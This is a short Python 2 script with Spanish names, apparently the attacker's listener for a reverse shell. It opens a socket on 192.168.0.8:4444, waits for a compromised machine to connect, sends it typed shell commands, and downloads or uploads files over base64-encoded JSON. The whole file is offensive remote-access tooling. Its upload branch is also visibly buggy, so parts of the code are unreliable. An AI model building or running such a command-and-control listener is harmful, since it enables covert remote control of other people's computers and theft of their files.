import socket, json,  base64, os

class Listener():
    def __init__(self, ip, port):
        
        listener= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[-] Espernado por conexiones")

        self.connection, addres= listener.accept()
        print("[+] Conexion de " + str(addres))

    def Enviar(self, data):
        json_data= json.dumps(data)
        self.connection.send(json_data)

    def Recibir(self):
        json_data= ""
        while True:
            try:
                json_data= self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def Leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def Escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga finalizada"


    def Ejecutar_remoto(self, cmd):
        self.Enviar(cmd)
        
        if cmd[0]== "salir":
            self.connection.close()
            exit()

        return self.Recibir()
    
    def Correr_programa(self):
        while True:
            command = raw_input("Shell >> ")
            command= command.split(" ")
            resultado = self.Ejecutar_remoto(command)

            if command[0] == "descargar":
                resultado= self.Escribir_archivo(command[1], resultado)
            elif command[0] == "subir":
                resultado== self.Escribir_archivo(command[1, command[2]])

            print(resultado)

os.system("clear")
escuchar= Listener("192.168.0.8", 4444)
escuchar.Correr_programa()
